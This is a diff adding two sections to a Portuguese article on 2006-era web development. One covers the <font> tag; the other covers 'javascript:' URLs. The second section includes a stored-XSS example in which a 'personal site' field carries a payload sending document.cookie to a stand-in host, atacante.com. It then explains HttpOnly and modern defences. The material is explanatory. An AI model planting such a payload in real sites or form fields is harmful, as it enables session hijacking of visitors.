@@ -93,6 +93,43 @@ O layout baseado em tabelas não era preguiça. Era pragmatismo. CSS 2.1 era esp
 
 ---
 
+## `<font face>`: tipografia direto no HTML
+
+Antes do CSS ser confiável para texto, o controle de fonte era feito com a tag `<font>` inline no HTML. O atributo `face` especificava a família tipográfica, `size` ia de 1 a 7, e `color` definia a cor.
+
+```html
+<font face="Arial, Helvetica, sans-serif" size="4" color="#333333">
+  Texto no corpo da página
+</font>
+
+<font face="Comic Sans MS, Cursive" size="5" color="#ff0000">
+  Título chamativo
+</font>
+
+<!-- combinação típica: fonte, tamanho e cor repetidos em cada bloco -->
+<table width="780" cellpadding="5">
+  <tr>
+    <td>
+      <font face="Verdana, Arial" size="2" color="#666666">
+        <b>Produto:</b> Notebook Dell Inspiron<br>
+        <b>Preço:</b> <font color="#cc0000">R$ 2.499,00</font><br>
+        <font size="1">* Preço válido até 31/12/2006</font>
+      </font>
+    </td>
+  </tr>
+</table>
+```
+
+A tag `<font>` se repetia em volta de cada bloco de texto, cada parágrafo, cada célula. Uma página com 50 parágrafos tinha 50 pares de `<font>`. Se o design mudasse, o desenvolvedor alterava cada um manualmente.
+
+As fontes disponíveis eram apenas as instaladas no computador do usuário. O atributo `face` funcionava como uma lista de fallbacks: `"Arial, Helvetica, sans-serif"` significava tentar Arial primeiro, se não estivesse instalada usar Helvetica, se não houvesse nenhuma das duas, usar a sans-serif padrão do sistema. Não havia garantia de que o usuário via a mesma fonte que o designer.
+
+O CSS1 já tinha `font-family`, `font-size` e `color` desde 1996, mas o suporte nos browsers era irregular. A transição de `<font>` para CSS aconteceu gradualmente entre 2004 e 2008. O HTML 4.01 marcou a tag como obsoleta em 1997. Na prática, a indústria continuou usando por anos depois disso.
+
+*Fontes: [font element](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/font) — MDN Web Docs; [HTML 4.01 Specification](https://www.w3.org/TR/html401/present/graphics.html#h-15.2) — W3C*
+
+---
+
 ## Não existia DevTools. Não existia Chrome.
 
 O Firefox lançou em 2004. Em 2006, estava na segunda versão. O plugin que mudou tudo foi o **Firebug**, lançado em março de 2006: o primeiro inspetor de elementos real, console JavaScript, e painel de rede.
@@ -1032,6 +1069,71 @@ Sites de humor da época distribuíam links com títulos como *"não clique aqui
 O Firefox 1.0 (2004) foi um dos primeiros a bloquear popups por padrão, com um aviso no topo da página: *"Firefox bloqueou um popup neste site."* O IE só adicionou bloqueio nativo no IE7, em 2006. Até lá, a única defesa era não clicar em links suspeitos, ou instalar uma toolbar do Yahoo que bloqueava por conta própria.
 
 *Fonte: [Pop-up ad](https://en.wikipedia.org/wiki/Pop-up_ad) — Wikipedia*
+
+---
+
+## `javascript:` na URL: código no lugar de endereço
+
+Era comum o JavaScript ser executado diretamente da barra de endereços ou em links `<a>`. Qualquer elemento `<a>` com `href="javascript:..."` executava o código ao ser clicado, sem navegar para lugar nenhum.
+
+```html
+<!-- botão de voltar sem depender do servidor -->
+<a href="javascript:history.back()">← Voltar</a>
+
+<!-- abrir popup com parâmetros controlados -->
+<a href="javascript:window.open('ajuda.html','ajuda','width=400,height=300')">
+  Ajuda
+</a>
+
+<!-- confirmar antes de navegar -->
+<a href="javascript:if(confirm('Tem certeza que deseja sair?')) window.location='logout.php'">
+  Sair
+</a>
+
+<!-- o clássico "link que não faz nada" -->
+<a href="javascript:void(0)" onclick="abrirMenu()">Menu</a>
+```
+
+`javascript:void(0)` era um padrão para tornar um link clicável para eventos sem navegar. `void(0)` avalia a expressão `0` e retorna `undefined`, impedindo a navegação padrão.
+
+O mesmo protocolo funcionava na barra de endereços. No IE6 e no Firefox 2, era possível digitar diretamente:
+
+```
+javascript:alert(document.cookie)
+```
+
+O browser executava o código no contexto da página atual. Desenvolvedores usavam isso para testar pequenos trechos sem precisar abrir o Firebug, que ainda era novo.
+
+O problema de segurança: se qualquer parte da aplicação ecoava entrada do usuário diretamente num atributo `href`, o atacante injetava código. Se uma página de perfil renderizava `<a href="[site do usuário]">`, e o atacante se cadastrava com `javascript:document.location='https://atacante.com?c='+document.cookie` no campo "site pessoal", qualquer visitante que clicasse no link vazava a sessão.
+
+```html
+<!-- campo "site pessoal" do cadastro preenchido pelo atacante com: -->
+<!-- javascript:document.location='https://atacante.com?c='+document.cookie -->
+
+<!-- saída no perfil da vítima, sem sanitização: -->
+<a href="javascript:document.location='https://atacante.com?c='+document.cookie">
+  Site pessoal
+</a>
+```
+
+O roubo de cookie era agravado por outro detalhe: o atributo `HttpOnly` não existia na prática em 2006. Ele foi introduzido pela Microsoft no IE6 SP1 em 2002, mas era desconhecido pela maioria dos desenvolvedores e não havia especificação formal. Sem `HttpOnly`, `document.cookie` era acessível a qualquer JavaScript da página, incluindo código injetado. A especificação oficial só veio com a RFC 6265, em 2011.
+
+```php
+<?php
+// sem HttpOnly: cookie acessível por JavaScript
+setcookie('sessao', $token, time() + 3600, '/');
+
+// com HttpOnly: JavaScript não consegue ler o cookie
+setcookie('sessao', $token, time() + 3600, '/', '', false, true);
+// o último parâmetro true é o httponly
+?>
+```
+
+Em 2006, praticamente nenhum cookie de sessão usava `HttpOnly`. Qualquer XSS na página, por `javascript:` em `href`, por `eval()` em dados do servidor, ou por qualquer outro vetor, resultava em `document.cookie` exposto e sessão comprometida.
+
+O protocolo `javascript:` ainda funciona em 2026 em qualquer browser. O que mudou foi o contexto ao redor: React, Vue e Angular sanitizam URLs por padrão e rejeitam o protocolo em atributos dinâmicos. CSP pode bloquear execução inline. Em 2006, não havia nenhuma dessas camadas, e event handlers inline misturados com `javascript:` em `href` eram padrão sem segunda consideração.
+
+*Fonte: [javascript: URLs](https://developer.mozilla.org/en-US/docs/Web/URI/Schemes/javascript) — MDN Web Docs*
 
 ---
 
